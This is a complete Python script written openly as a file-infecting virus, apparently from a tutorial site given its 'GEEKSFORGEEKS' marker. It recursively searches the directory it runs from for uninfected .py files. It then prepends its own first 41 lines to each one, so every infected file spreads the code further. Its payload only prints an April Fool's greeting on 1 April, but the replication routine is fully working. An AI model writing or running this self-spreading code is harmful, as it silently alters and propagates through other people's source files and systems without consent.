#!/usr/bin/python 
import datetime
import inspect
import os

DATA_TO_INSERT = "GEEKSFORGEEKS"


# search for target files in path
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:
        # If it is a folder
        if os.path.isdir(path + "/" + filename):
            filestoinfect.extend(search(path + "/" + filename))

        # If it is a python script -> Infect it
        elif filename[-3:] == ".py":

            # default value
            infected = False
            for line in open(path + "/" + filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if not infected:
                filestoinfect.append(path + "/" + filename)
    return filestoinfect


# changes to be made in the target file
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 41:
            virusstring += line
    virus.close()
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

    # Not required actually


def explode():
    if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
        print("HAPPY APRIL FOOL'S DAY!!")


filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
explode()
